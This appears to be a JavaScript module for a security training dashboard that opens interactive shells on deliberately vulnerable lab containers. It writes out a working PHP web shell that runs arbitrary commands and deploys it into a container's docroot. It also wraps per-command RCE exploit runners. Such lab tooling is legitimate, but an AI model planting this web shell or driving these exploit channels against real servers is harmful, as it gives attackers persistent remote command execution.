// Interactive shell backends for the lab targets.
//
// Design: every backend exposes the same async `exec(cmd)` contract, so the
// HTTP layer stays uniform. Preference order is "richest shell that actually
// works":
//
//   1. webshell  — after a confirmed RCE, drop a PHP shell into a writable
//                  bind-mounted docroot. Gives a persistent, real command
//                  channel with correct exit handling.
//   2. rce       — re-run the exploit per command. Slower (seconds per command)
//                  and stateless (no cd/env persistence), but needs no writable
//                  docroot, so it is the fallback.
//
// The frontend therefore always gets a prompt; which backend answered is shown
// in the banner rather than hidden.

import { execFile, spawn } from 'node:child_process'
import { promisify } from 'node:util'
import { randomBytes } from 'node:crypto'
import { writeFile, rm } from 'node:fs/promises'
import { join } from 'node:path'

const execFileAsync = promisify(execFile)

const SHELL_PHP = `<?php
// Interactive shell deployed by the vulnerable app itself (lab use only).
// Runs one command per request; output and exit code are returned verbatim.
header('Content-Type: text/plain; charset=utf-8');
$cmd = isset($_POST['c']) ? $_POST['c'] : (isset($_GET['c']) ? $_GET['c'] : 'id');
$out = array();
$rc = 0;
exec($cmd . ' 2>&1', $out, $rc);
echo implode("\\n", $out);
echo "\\n__RC__" . $rc;
`

function randName () {
  return 'pwn_' + randomBytes(4).toString('hex') + '.php'
}

async function sh (cmd, args, opts = {}) {
  const { stdout, stderr } = await execFileAsync(cmd, args, {
    timeout: opts.timeout ?? 120000,
    maxBuffer: 8 * 1024 * 1024,
    ...opts
  })
  return { stdout, stderr }
}

/** Persistent webshell reached over HTTP. */
class WebShellBackend {
  constructor ({ kind, container, baseUrl, shellPath, deploy, cleanup }) {
    this.kind = 'webshell'
    this.container = container
    this.baseUrl = baseUrl
    this.shellPath = shellPath
    this.deploy = deploy
    this.cleanupFn = cleanup
  }

  async exec (cmd) {
    const res = await fetch(`${this.baseUrl}${this.shellPath}`, {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ c: cmd })
    })
    const text = await res.text()
    // The shell appends __RC__<code>; split it off so output stays clean.
    const idx = text.lastIndexOf('__RC__')
    if (idx === -1) return { output: text, code: 0 }
    const output = text.slice(0, idx).replace(/\n$/, '')
    const code = Number(text.slice(idx + 6).trim()) || 0
    return { output, code }
  }

  async close () {
    if (this.cleanupFn) await this.cleanupFn().catch(() => {})
  }
}

/** Stateless: one full exploit run per command. */
class RceBackend {
  constructor ({ runCommand }) {
    this.kind = 'rce'
    this.runCommand = runCommand
  }

  async exec (cmd) {
    const output = await this.runCommand(cmd)
    return { output, code: 0 }
  }

  async close () {}
}

/**
 * session-poison: the lab mounts the host target dir at /var/www/html, so a
 * shell written there is served directly and survives independent of the
 * poisoned session file.
 */
async function openSessionPoisonShell (target) {
  const name = randName()
  const local = `/tmp/${name}`
  await writeFile(local, SHELL_PHP, 'utf8')
  await sh('docker', ['cp', local, `${target.container}:/var/www/html/${name}`])
  await sh('docker', ['exec', target.container, 'chmod', '644', `/var/www/html/${name}`])

  const backend = new WebShellBackend({
    container: target.container,
    baseUrl: target.url,
    shellPath: `/${name}`,
    cleanup: async () => {
      // Sweep every pwn_* file, not just this one: a previous crashed run may
      // have left its own behind in the same bind-mounted docroot.
      await sh('docker', ['exec', target.container, 'sh', '-c', 'rm -f /var/www/html/pwn_*.php'])
        .catch(() => {})
      await rm(local, { force: true })
    }
  })

  // Verify the shell really answers before handing it to the user.
  const probe = await backend.exec('id')
  if (!/uid=\d+/.test(probe.output)) {
    await backend.close()
    throw new Error('webshell 部署后未返回预期输出')
  }
  return backend
}

/**
 * php2shell: the docroot is mounted :ro and the RCE payload is capped at 14
 * bytes per call with no shell state, so a persistent shell is not available
 * through the same channel. /out IS a writable bind mount, and the lab's own
 * proof endpoint serves it, so commands are still real; each one re-runs the
 * exploit (auto-staged for long commands by run_exp.sh).
 */
async function openPhp2ShellBackend (target) {
  if (!target.runExp || !target.labKey) {
    throw new Error(`目标 ${target.container} 没有配置 run_exp 通道，无法提供 shell`)
  }
  const runCommand = (cmd) => new Promise((resolve, reject) => {
    const child = spawn('bash', [target.runExp, cmd, target.labKey], {
      env: { ...process.env },
      stdio: ['ignore', 'pipe', 'pipe']
    })
    let out = ''
    child.stdout.on('data', (c) => { out += c })
    child.stderr.on('data', (c) => { out += c })
    child.on('error', reject)
    child.on('close', () => {
      // run_exp.sh prints a delimited result block; prefer it over raw logs.
      const m = out.match(/===== 执行结果 =====\n([\s\S]*?)\n====================/)
      resolve(m ? m[1] : out.trim())
    })
  })
  return new RceBackend({ runCommand })
}

/**
 * React2Shell: the lab ships its own runner. Its `cmd` mode is one exploit run
 * per command (no cd/env carry-over), and it reports success by writing proof
 * inside the container, so we trust its output text rather than an HTTP code.
 */
async function openR2sBackend (target) {
  if (!target.labDir || !target.shellPort) {
    throw new Error(`目标 ${target.container} 未配置 r2s 运行参数`)
  }
  const runCommand = (cmd) => new Promise((resolve, reject) => {
    const child = spawn('python3', [
      join(target.labDir, 'scripts', 'r2s_shell.py'),
      '--port', target.shellPort,
      '--container', target.container,
      'cmd', cmd
    ], { cwd: target.labDir, stdio: ['ignore', 'pipe', 'pipe'] })
    let out = ''
    child.stdout.on('data', (c) => { out += c })
    child.stderr.on('data', (c) => { out += c })
    child.on('error', reject)
    child.on('close', () => {
      // Drop the runner's own [exit ] trailer, keep the command's output.
      resolve(out.replace(/\[exit[^\]]*\]\s*$/m, '').trimEnd())
    })
  })
  return new RceBackend({ runCommand })
}

export async function openShell (target) {
  if (target.shellMode === 'webshell') return openSessionPoisonShell(target)
  if (target.shellMode === 'r2s') return openR2sBackend(target)
  return openPhp2ShellBackend(target)
}

/**
 * Remove shells left behind by a crashed or restarted dashboard.
 *
 * The session-poison lab serves its host directory through a bind mount, so a
 * deployed shell lives in the lab's source tree until removed. Sweeping on
 * startup keeps that tree clean even when a session dies without closing.
 */
export async function sweepStaleShells (containers) {
  for (const container of containers) {
    await sh('docker', ['exec', container, 'sh', '-c', 'rm -f /var/www/html/pwn_*.php'])
      .catch(() => {})
  }
}
